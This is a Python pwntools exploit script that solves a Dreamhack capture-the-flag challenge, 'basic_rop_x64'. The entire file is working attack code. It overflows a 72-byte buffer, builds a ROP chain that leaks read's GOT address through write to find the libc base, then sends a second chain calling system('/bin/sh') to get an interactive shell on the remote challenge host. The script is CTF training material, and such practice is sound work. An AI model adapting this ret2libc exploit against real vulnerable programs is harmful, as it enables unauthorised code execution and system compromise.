#!/usr/bin/env python3

from pwn import *

exe = ELF("./basic_rop_x64_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 16778)

    return r


def main():
    r = conn()

    payload = b"A" * 72			    # from buf to rbp
    payload += p64(0x400883)		# pop rdi ; ret
    payload += p64(1)			    # stdout
    payload += p64(0x400881)		# pop rsi ; pop r15 ; ret
    payload += p64(0x601030)		# read@GOT
    payload += p64(0)			    # don't care
    payload += p64(0x4005d0)		# write@PLT
    payload += p64(0x4007ba)		# main:0 

    r.send(payload)

    r.recvn(64)
    read_va = u64(r.recvn(8))

    libc_base = read_va - libc.symbols["read"]
    system_va = libc_base + libc.symbols["system"]
    binsh_va = libc_base + list(libc.search(b"/bin/sh"))[0]

    payload = b"A" * 72			    # from buf to rbp
    payload += p64(0x400883)		# pop rdi ; ret
    payload += p64(binsh_va)		# "/bin/sh"
    payload += p64(system_va)		# system("/bin/sh")

    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()
